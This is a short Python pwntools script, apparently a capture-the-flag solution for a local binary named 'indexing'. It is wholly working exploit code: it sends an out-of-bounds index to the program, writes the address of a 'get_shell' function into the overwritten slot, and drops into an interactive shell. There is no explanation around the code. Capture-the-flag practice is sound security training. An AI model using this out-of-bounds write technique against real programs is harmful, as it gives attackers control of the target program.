#!/usr/bin/env python
from pwn import *
elf = ELF('./indexing')
p = process('./indexing')

index = (256 + 8) / 8

p.recvuntil('Index: ')
p.sendline(str(int(index))) 


# Give value
p.recvuntil('Value: ')
p.sendline(str(elf.symbols['get_shell'])) 
p.interactive()